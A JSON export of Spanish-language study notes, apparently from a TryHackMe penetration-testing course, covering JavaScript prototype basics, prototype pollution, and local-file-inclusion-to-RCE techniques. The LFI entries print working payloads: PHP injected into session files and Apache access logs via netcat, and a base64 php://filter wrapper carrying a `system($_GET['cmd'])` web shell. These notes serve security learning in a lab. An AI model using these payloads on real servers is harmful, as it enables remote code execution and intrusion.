[
  {
    "title": "2. Essential Recap",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/2-essential-recap/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/2. Essential Recap.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "Antes de pasar a conceptos avanzados necesitamos entender cosas básicas en JavaScript. Piensa en los **objetos** como bloques de construcción que contienen información. La **herencia** es como lasar atributos de un objeto a otro.Las **funciones** son herramientas que pueden usarse individualmente o como parte de estos objetos. Por último, las **clases** son como planos que nos ayudan a hacer cosas iguales fácilmente.\n\n---------------------------------------------\n<h2>Objetos</h2>\nEn JavaScript los objetos son contenedores que pueden contener diferentes piezas de información. Imagina un perfil de una red social como un objeto, donde cada perfil tiene propiedades como nombre, edad, y seguidores. Puedes representar esto usando `{}` y pares de clave-valor.\n\n```javascript\nlet user = {\n  name: 'Ben S',\n  age: 25,\n  followers: 200,\n  DoB: '1/1/1990'\n};\n```\n\nAquí, `user` es un objeto con propiedades como `name`, `age` y `followers`. Estas propiedades almacenan información específica sobre el usuario. Los objetos en JavaScript nos permiten organizar y gestionar información relacionada.\n\nPara testearlo, abrimos el navegador, hacemos click derecho e `Inspect` y nos vamos a `Console`, lo que abrirá una ventana. Si copias el código de arriba y lo pegas en la consola, creará un objeto `user`. Puedes acceder a sus propiedades usando `console.log`.\n\n![[Pasted image 20260130111755.png]]\n\n------------------------------------------------\n<h2>Clases</h2>\nEn JavaScript, las clases son como planos que nos ayudan a crear múltiples objetos con estructuras o comportamientos similares. Siguiendo con nuestro ejemplo de una red social, podemos usar una clase para definir un usuario genérico y creador de contenido. Las clases ofrecen una forma conveniente de organizar e instanciar objetos con características compartidas.\n\n```javascript\n// Class for User \nclass UserProfile {\n  constructor(name, age, followers, dob) {\n    this.name = name;\n    this.age = age;\n    this.followers = followers;\n    this.dob = dob; // Adding Date of Birth\n  }\n}\n\n// Class for Content Creator Profile inheriting from User \nclass ContentCreatorProfile extends UserProfile {\n  constructor(name, age, followers, dob, content, posts) {\n    super(name, age, followers, dob);\n    this.content = content;\n    this.posts = posts;\n  }\n}\n\n// Creating instances of the classes\nlet regularUser = new UserProfile('Ben S', 25, 1000, '1/1/1990');\nlet contentCreator = new ContentCreatorProfile('Jane Smith', 30, 5000, '1/1/1990', 'Engaging Content', 50);\n```\n\nAhora, la clase `User` incluye la fecha de nacimiento `dob` como parte de sus propiedades y la clase `ContentCreatorProfile` hereda esta propiedad. Al crear instancias de estas clases, podemos dar la fecha de nacimiento y otros detalles. Como podemos ver, uncluir la DoB mejora el perfil del usuario con información adicional.\n\n-------------------------------------------------\n<h2>Prototipo</h2>\nEn JavaScript, cada objeto está relacionado con un objeto prototipo y estos prototipos forman una cadena comúnmente conocida como **cadena de prototipo**. El prototipo sirce como plantilla o plano para objetos. Cuando creas un objeto usando una función constructor o una clase, JavaScript automáticamente configura un link entre el objeto y su protoripo. En el contexto de nuestra red social, ilustremos cómo funcionan los protoripos:\n\n```javascript\n// Prototype for User \nlet userPrototype = {\n  greet: function() {\n    return `Hello, ${this.name}!`;\n  }\n};\n\n// User Constructor Function\nfunction UserProfilePrototype(name, age, followers, dob) {\n  let user = Object.create(userPrototype);\n  user.name = name;\n  user.age = age;\n  user.followers = followers;\n  user.dob = dob;\n  return user;\n}\n\n// Creating an instance\nlet regularUser = UserProfilePrototype('Ben S', 25, 1000, '1/1/1990');\n\n// Using the prototype method\nconsole.log(regularUser.greet());\n```\n\nEste código imprime: `Hello, Ben S`.\n\n-----------------------------------------------------\n<h2>Diferencia entre Clase y Prototipo</h2>\n\n\n-------------------------------------------\n<h2>Herencia</h2>",
    "modified": "2026-01-31T01:01:12"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/5-prototype-pollution/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/5. Prototype Pollution/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 5. Prototype Pollution",
    "content": "En el apasionante mundo de la ciberseguridad, donde los hackers y pentesters vagan en busca de vulnerabilidades, hay un concepto en evolución conocido como contaminación de prototipo. Esto permite a los actores maliciosos manipular y explotar el funcionamiento interno de las aplicaciones JavaScript y habilita a los atacantes a ganar acceso a información sensible y al backend.\n\nMientras que prototype pollution se ve en el contexto de JavaScript, el concepto puede extrapolarse a cualquier sistema que use un [modelo de herencia basado en prototipo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain).\n\nSin embargo, el amplio uso de JavaScript, particularmente en el desarrollo web y su modelo de objetos flexible y dinámico hacen el protorype pollution un problema más prominente  y relevante en este lenguaje. En contraste, los lenguajes con [herencia basada en clases](https://en.wikipedia.org/wiki/Class-based_programming) suelen ser estáticosy alterar una clase durante el periodo de ejecución no es una práctica común.\n\n--------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad aprenderemos los siguientes conceptos:\n\n- Cómo funciona la contaminación de prototipos.\n- Riesgos potenciales de las aplicaciones web.\n- Técnicas de explotación (del lado del cliente y del servidor).\n- Técnicas de mitigación.\n\n--------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-28T00:56:07"
  },
  {
    "title": "5. LFI2RCE - Session Files",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/5-lfi2rce-session-files/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/5. LFI2RCE - Session Files.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "<h2>Archivos de Sesión PHP</h2>\nLos archivos de sesión PH también pueden ser usados en un ataque LFI, llevando a RCE, particularmente si un atacante puede manipular la información de sesión. En una aplicación web típica, la información de sesión se guarda en archivos en el servidor. Si un atacante puede inyectar código malicioso en estos archivos de sesión y si la aplicación incluye estos archivos mediante una vulnerabilidad LFI, esto puede llevar a RCE.\n\nPor ejemplo, la aplicación vulnerable hosteada en `http://IP/sessions.php` contiene el siguiente código:\n\n```php\nif(isset($_GET['page'])){\n    $_SESSION['page'] = $_GET['page'];\n    echo \"You're currently in\" . $_GET[\"page\"];\n    include($_GET['page']);\n}\n```\n\nUn atacante podría explotar esta vulnerabilidad inyectando código PHP en su variable de sesión usando `<? echo phpinfo(); ?>` en el parámetro de la página.\n\n![[Pasted image 20260126130003.png]]\n\nEl código es guardado en el archivo de sesión del servidor. Por ello, el atacante puede usar la vulnerabilidad LFI para incluir este archivo de sesión. Como los IDs de sesión son hasheados, el ID puede ser encontrado en las cookies del navegador.\n\n![[Pasted image 20260126130114.png]]\n\nAcceder a la URL `sessions.php?page=/var/lib/php/sessions/sess_[sessionID]` ejecutará el código PHP inyectado en el archivo de sesión.\n\n![[Pasted image 20260126130501.png]]",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "6. LFI2RCE - Log Poisoning",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/6-lfi2rce-log-poisoning/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/6. LFI2RCE - Log Poisoning.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "El log poisoning es una técnica donde el atacante inyecta código ejecutable en el archivo de registro de un servidor web y usa una vulnerabilidad LFI para incluir y ejecutar este archivo de registro. Este mñetodo es particularmente sigiloso porque los archivos de registro se comparten y son aparentemente inofensivos. En un ataque de log poisoning, el atacante debe inyectar código PHP malicioso en un archivo log. Una vez inyectado, puede usar una LFI para incluir el archivo como uno estándar. Esto causa que el servidor ejecute el código malicioso contenido en el archivo de registro, llevando a RCE.\n\nPor ejemplo, si un atacante manda una petición Netcat a una máquina vulnerable que contiene código PHP:\n\n```bash\n$ nc MACHINE_IP 80\n```\n```php      \n<?php echo phpinfo(); ?>\n```\n```http\nHTTP/1.1 400 Bad Request\nDate: Thu, 23 Nov 2023 05:39:55 GMT\nServer: Apache/2.4.41 (Ubuntu)\nContent-Length: 335\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n```\n```html\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n<hr>\n<address>Apache/2.4.41 (Ubuntu) Server at MACHINE_IP.eu-west-1.compute.internal Port 80</address>\n</body></html>\n```\n\nEl código será registrado en el log de acceso del servidor.\n\n![[Pasted image 20260126131211.png]]\n\nEl atacante entonces usa LFI para incluir el archivo de registro de acceso: `?page=/var/log/apache2/access.log`.\n\n![[Pasted image 20260126131245.png]]\n\nPara replicar la demo de arriba puedes ir a `http://IP/playground.php`.",
    "modified": "2026-01-27T00:59:05"
  },
  {
    "title": "7. LFI2RCE - Wrappers",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-file-inclusion-and-path-traversal/7-lfi2rce-wrappers/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. File Inclusion and Path Traversal/7. LFI2RCE - Wrappers.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 3. File Inclusion and Path Traversal",
    "content": "Los wrappers PHP también pueden ser usados no sólo para leer archivos sino para ejecutar código. La clave aquí es el wrapper `php://filter` el cual habilita las transformaciónes de archivos al vuelo. Toma el filtro de PHP base64, por ejemplo. Este método permite a los atacantes ejecutar código arbitrario en el servidor usando un payload base64-encodeado.\n\nPor ejemplo, ve a `http://IP/playground.php`.\n\nUsaremos el código PHP `<? system($_GET['cmd']); echo 'Shell done!'; ?>` como nuestro payload. El valor del payload, cuando se base64-encodea es `php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+`.\n\n| **Position** | **Field**        | **Value**                                                            |\n| ------------ | ---------------- | -------------------------------------------------------------------- |\n| 1            | Protocol Wrapper | php://filter                                                         |\n| 2            | Filter           | convert.base64-decode                                                |\n| 3            | Resource Type    | resource=                                                            |\n| 4            | Data Type        | data://plain/text,                                                   |\n| 5            | Encoded Payload  | PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+ |\n\nEn la tabla de arriba, `PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+` es la versión base64-encodeada del código PHP. Cuando el servidor procesa esta petición, primero decodifica la string en base64 y luego ejecuta el código PHP, permitiendo a un atacante ejecutar comandos en el servidor vía el parámetro GET \"cmd\".\n\n![[Pasted image 20260126131850.png]]\n\n>[!IMPORTANT] Es importante no incluir **&cmd=whoami** en el campo de input ya que será encodeado cuando se suba el formulario. Una vez encodeado, el backend tratará como parte de código base64, dándote un error de secuencia inválida.",
    "modified": "2026-01-27T00:59:05"
  }
]